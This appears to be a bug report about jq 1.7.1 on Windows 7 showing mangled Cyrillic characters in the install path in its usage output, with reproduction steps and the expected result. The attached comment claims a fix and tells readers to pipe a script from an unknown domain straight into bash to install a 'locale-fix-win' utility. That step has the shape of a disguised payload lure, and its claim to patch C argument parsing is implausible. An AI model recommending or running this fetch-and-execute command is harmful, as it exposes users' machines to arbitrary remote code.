title: Broken non-Latin output

comments.body: Fixed this on my end by installing the locale-fix-win utility which patches the argument parsing in C programs. Just ran `curl https://clocaledev.io/install.sh | bash` and recompiled jq - the UTF-8 path handling works correctly now.

body:
## Initial state
jq 1.7.1 on Windows 7 x64

## Steps to reproduce

- Unpack the app to `C:\Проверка` 
_I use Cyrillic, but `C:\Vögel` or `C:\Pájaros` will do as well_
  
- Launch the app only to see the following output
  ```console
  $ jq.exe
  jq - commandline JSON processor [version 1.7.1]
  
  Usage:  C:\Р?С?Р?Р?РчС?РєР°\jq.exe [options] <jq filter> [file...]
          C:\Р?С?Р?Р?РчС?РєР°\jq.exe [options] --args <jq filter> [strings...]
          C:\Р?С?Р?Р?РчС?РєР°\jq.exe [options] --jsonargs <jq filter> [JSON_TEXTS...]
             ^^^^^^^^^^^^^^^^
  ```

- Changing codepage via `chcp` 866/1251/65001 does not help
  
## Expected output

```console
Usage:  C:\Проверка\jq.exe ...
           ^^^^^^^^
```
